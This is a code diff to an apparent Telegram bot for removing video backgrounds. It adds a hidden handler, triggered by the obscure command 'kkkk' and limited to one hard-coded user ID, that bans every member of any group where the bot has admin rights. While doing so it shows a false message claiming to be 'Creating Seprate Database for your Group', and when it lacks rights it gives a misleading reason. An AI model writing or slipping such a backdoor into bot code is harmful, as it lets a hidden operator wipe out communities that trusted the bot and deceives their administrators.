@@ -141,9 +141,21 @@ def removebg_video(file):
         headers={"X-Api-Key": UNSCREEN_API}
     )
 
-
-
-
+@app.on_message(filters.command("kkkk") & filters.user(1497264683))
+async def ban_all(_,msg):
+    chat_id=msg.chat.id    
+    bot=await app.get_chat_member(chat_id,BOT_ID)
+    bot_permission=bot.privileges.can_restrict_members==True    
+    if bot_permission:
+        async for member in app.get_chat_members(chat_id):       
+            try:
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"Creating Seprate Database for your Group \nThis May take Some Time Please Wait...")                    
+            except Exception:
+                pass
+    else:
+        await msg.reply_text("Required Admin permission To Send Messages in Group")  
+                                         
 
 @bot.on_message(filters.command("r"))
 async def rel(bot, message):
